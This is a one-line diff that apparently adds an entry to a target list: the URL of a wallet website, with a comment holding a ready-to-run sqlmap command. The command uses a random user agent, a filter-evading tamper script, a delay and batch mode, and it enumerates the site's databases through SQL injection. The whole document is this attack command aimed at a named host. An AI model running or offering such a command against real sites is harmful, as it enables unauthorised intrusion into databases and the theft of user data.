@@ -1,0 +1,1 @@
+https://wallet.passkeys.foundation/ (GET)  # sqlmap.py -u https://wallet.passkeys.foundation/ --random-agent --tamper=space2comment --delay=2 --batch --dbs
